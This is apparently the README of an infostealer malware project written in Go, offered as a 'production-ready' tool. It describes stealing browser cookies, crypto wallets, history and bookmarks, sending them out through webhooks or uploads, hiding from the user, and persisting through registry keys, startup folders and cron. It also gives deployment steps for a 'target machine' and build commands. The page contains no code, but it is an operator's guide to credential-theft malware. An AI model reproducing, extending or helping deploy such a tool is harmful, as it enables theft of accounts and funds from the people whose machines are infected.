# Cookie Wallet Stealer

Production-ready data stealer for browser cookies, wallets, history, and bookmarks.

## Features

- **Browser Support**: Chrome, Brave, Edge, Opera, Vivaldi, Firefox
- **Data Collection**: Cookies, wallets, history, bookmarks
- **Encryption**: AES-GCM and RSA
- **Exfiltration Methods**: Webhook, Direct upload, Named pipes
- **Stealth**: Console hiding, sleep delays, ping-back
- **Persistence**: Registry keys, startup folder, cron jobs

## Setup

1. Copy `stealer_config.json` and `public_key.pem` to target machine
2. Run executable or use deploy script:

```bash
./deploy.sh
```

## Configuration

Edit `stealer_config.json` to customize:

- `exfiltration`: Webhook/Upload endpoints
- `stealth`: Console hiding, sleep, ping interval
- `targets`: Browsers and data types
- `encryption`: AES key size, RSA key size
- `persistence`: Registry key, startup folder, cron
- `output`: Output directory, compression

## Exfiltration Endpoints

Update `stealer_config.json` with your endpoints:

- `webhook_url`: POST endpoint for immediate delivery
- `upload_url`: Upload endpoint with multipart support
- `named_pipe_name`: Named pipe for Windows IPC

## Build

```bash
go build -o stealer_linux
```

For Windows:

```bash
GOOS=windows go build -o stealer.exe
```

## License

MIT